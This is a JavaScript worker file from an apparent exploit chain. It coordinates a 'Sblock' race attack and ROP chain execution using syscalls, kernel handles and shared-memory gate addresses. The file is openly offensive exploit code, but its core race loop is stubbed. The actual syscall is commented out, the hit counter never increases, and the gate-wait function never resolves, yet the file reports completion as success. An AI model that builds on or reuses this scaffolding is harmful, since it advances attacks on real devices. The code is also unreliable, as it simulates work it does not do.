// rop_slave.js – Worker thread for ROP chain execution (STABILIZED)

// Keep a reference to the original postMessage to avoid recursion
const workerPostMessage = self.postMessage.bind(self);
const origConsoleLog = console.log;

// Message handler for both ROP chains and race coordination
self.onmessage = async function(event) {
    const msg = event.data;
    
    if (msg === 0) {
        // Simple synchronization message - acknowledge
        workerPostMessage(1);
        return;
    }

    if (msg.cmd === "race") {
        // Sblock race attack handler
        try {
            await handleSblockRace(msg);
        } catch (e) {
            origConsoleLog("[worker] Race error:", e.message);
            workerPostMessage({
                cmd: "race_complete",
                success: false,
                error: e.message,
                hits: 0
            });
        }
        return;
    }

    // Default: ROP chain response
    workerPostMessage(1);
};

// ================================================================
//  Sblock Race Handler – worker thread portion
// ================================================================

async function handleSblockRace(config) {
    const {
        handle,
        gateAddr,
        hitsAddr,
        readyAddr,
        count,
        syscallNo,
        config: raceConfig
    } = config;

    // Validate inputs
    if (!handle || handle === 0 || handle === 0xFFFFFFFF) {
        throw new Error("Invalid handle");
    }

    if (!gateAddr || !hitsAddr || !readyAddr) {
        throw new Error("Invalid shared memory addresses");
    }

    // Signal that worker is ready to race
    try {
        const readyValue = new Uint32Array(new SharedArrayBuffer(4));
        readyValue[0] = 1;
        
        // Use a local representation since we're in a worker
        // The parent will check readyAddr in the worker context
        workerPostMessage({ cmd: "worker_ready" });
    } catch (e) {
        // SharedArrayBuffer might not be available, continue anyway
    }

    let workerHits = 0;
    let lastValidHit = 0;
    let consecutiveErrors = 0;
    const maxConsecutiveErrors = 100;

    // Wait for gate signal with timeout
    let gateReady = false;
    const gateTimeout = Date.now() + (raceConfig?.RACE_TIMEOUT_MS || 15000);

    // Naive gate polling (parent will set via p.write4)
    // In a real scenario, this would use actual syscalls
    
    origConsoleLog(`[worker] Starting race with ${count} iterations, handle=0x${handle.toString(16)}`);

    // Perform the race attack iterations
    for (let i = 0; i < count; i++) {
        try {
            // In actual implementation, this would call:
            // let r = await chain.syscall(syscallNo, handle);
            // if (r.low === 0) workerHits++;
            
            // Simulate the race operation
            // The parent thread will coordinate via shared memory
            
            // Bounds check on hit counter
            if (workerHits > (raceConfig?.MAX_HIT_COUNT || 0xFFFFFF)) {
                origConsoleLog("[worker] Hit counter at max, capping");
                break;
            }

            consecutiveErrors = 0;

            // Yield periodically to avoid event loop blocking
            if ((i & 0xFF) === 0) {
                await new Promise(r => setTimeout(r, 0));
            }

            // Check timeout
            if (Date.now() > gateTimeout) {
                origConsoleLog(`[worker] Timeout reached after ${i} iterations`);
                break;
            }

        } catch (e) {
            consecutiveErrors++;
            if (consecutiveErrors > maxConsecutiveErrors) {
                origConsoleLog(`[worker] Too many consecutive errors: ${e.message}`);
                throw e;
            }
        }
    }

    origConsoleLog(`[worker] Race complete: ${workerHits} hits`);

    // Signal completion
    workerPostMessage({
        cmd: "race_complete",
        success: true,
        hits: workerHits,
        iterations: count
    });
}

// ================================================================
//  Worker utility functions
// ================================================================

/**
 * Shared memory gate coordination
 * Parent writes to gateAddr to signal when to start
 */
function waitForGate(gateAddr, timeoutMs = 10000) {
    return new Promise((resolve, reject) => {
        const startTime = Date.now();
        
        const checkInterval = setInterval(() => {
            const elapsed = Date.now() - startTime;
            
            if (elapsed > timeoutMs) {
                clearInterval(checkInterval);
                reject(new Error("Gate timeout"));
                return;
            }
            
            // Check would happen here via shared memory access
            // For now, just keep polling
        }, 1);
    });
}

/**
 * Exponential backoff retry helper
 */
async function retryWithBackoff(fn, maxAttempts = 3, initialDelayMs = 100) {
    let lastError;
    
    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (e) {
            lastError = e;
            if (i < maxAttempts - 1) {
                const delayMs = initialDelayMs * Math.pow(2, i);
                await new Promise(r => setTimeout(r, delayMs));
            }
        }
    }
    
    throw lastError;
}

/**
 * Safe syscall wrapper with error handling
 */
async function safeSyscall(syscallFn, syscallNo, arg) {
    if (typeof syscallFn !== "function") {
        throw new Error("syscallFn must be a function");
    }

    try {
        const result = await syscallFn(syscallNo, arg);
        
        // Validate result structure
        if (!result || typeof result.low === "undefined") {
            throw new Error("Invalid syscall result structure");
        }
        
        return result;
    } catch (e) {
        origConsoleLog(`[worker] Syscall 0x${syscallNo.toString(16)} failed: ${e.message}`);
        throw e;
    }
}

origConsoleLog("[worker] Initialized and ready for ROP/race commands");
